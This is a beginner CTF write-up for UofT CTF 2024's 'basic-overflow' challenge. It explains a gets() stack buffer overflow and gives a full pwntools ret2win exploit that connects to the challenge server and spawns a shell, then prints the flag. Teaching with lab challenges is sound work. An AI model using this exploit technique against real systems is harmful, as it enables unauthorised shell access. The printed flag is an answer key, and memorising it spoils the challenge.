---
layout: writeup
category: UofT-CTF-2024
chall_description:
points: 100
solves: 316
tags: UofT-CTF-2024 pwn pwn/ret2win pwn/buffer-overflow
date: 2024-1-15
comments: false
---

This challenge is simple.  

It just gets input, stores it to a buffer.  

It calls gets to read input, stores the read bytes to a buffer, then exits.  

What is gets, you ask? Well, it's time you read the manual, no?  

`man 3 gets`  

Cryptic message from author: There are times when you tell them something, but they don't reply. In those cases, you must try again. Don't just shoot one shot; sometimes, they're just not ready yet.  

Author: drec  
`nc 34.123.15.202 5000`  
[basic-overflow](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/UofT-CTF-2024/basic-overflow)  

---

Since this challenge is so simple, this writeup is intended primarily for complete beginners to pwn!  

We're given an ELF binary file. It is essentially a Linux executable, similar to .exe for Windows. We can decompile this with Ghidra, a powerful reverse-engineering tool. Download it if you don't have it!  

In Ghidra, on the left sidebar, we can open the Functions folder to see what sort of functions this program contains. Most of it is irrelevant, as some functions used for program functionality are also listed. However, there are two unusual functions that seem to be user-created. `main` and `shell`.  

Clicking on each allows us to see their decompilation. Here's `main`:  

```c
undefined8 main(void)

{
  char local_48 [64];
  
  gets(local_48);
  return 0;
}
```

Let's first examine main. The main function simply allocates 64 bytes for a character array, i.e. a string. It then calls gets() to receive user input for the variable. For people experienced with pwn, this is immediately a major red flag. gets() is vulnerable to buffer overflow. That is, it can receive more input than it should. So, even though only 64 bytes are allocated for the character array, the program could read in more than 64 bytes into the variable!  

Since the variable is located on the stack, which is essentially an area of the program's memory where variables and things like that are stored, it will *overflow* onto the stack, overwriting the memory of the program. Crucially, the return address is stored on the stack.  

The return address is essentially the location in the program that main() will return to after finishing and hitting the `return` statement. This is important, because if we can overwrite this return address, we can control what function main() executes next!  

Now let's take a look at shell.

```c
void shell(void)

{
  execve("/bin/sh",(char **)0x0,(char **)0x0);
  return;
}
```

All this does is pop a shell.  

So, this is a standard ret2win challenge where we must override the return address with the address of the win function to get a shell. We can easily do this with pwntools:  

```py
from pwn import *
import pwnlib.util.packing as pack

elf = ELF("./basic-overflow")
context.binary = elf
context.log_level = "DEBUG"
context(terminal=["tmux","split-window", "-h"])

# p = process('./basic-overflow')
# gdb.attach(p)

p = remote('34.123.15.202', 5000)


# p.sendline(
#     cyclic(1024)
# )

offset = cyclic_find('saaa')
shell = pack.p64(elf.symbols['shell'])
payload = offset*b'A' + shell
p.sendline(payload)

p.interactive()
```

Ignore the top half -- it's all just setup.  

In the bottom half, there is first a commented out line of a 'cyclic(1024)'. All this does is send a string to the program that enables us to find the offset of the return address. We know what the return address becomes (after it is opened in gdb with `gdb.attach(p)`) by entering 'continue' and looking at the RSP register, i.e. the stack pointer, which shows that it is the string `saaa` in the cyclic.  

Thus, our offset can be found using pwntool's `cyclic_find()` function. The address of the shell function can be found in the ELF's symbols, and our payload can be contructed as `offset*b'A' + shell`. Note that the address of the shell function must be 'packed' into little endian and x64 format. I would recommend Googling those two if you are unaware of what they are.  

Once we have our payload, we can send it to the remote service, pop a shell, and `ls` --> `cat flag` gives us our flag!  

    uoftctf{reading_manuals_is_very_fun}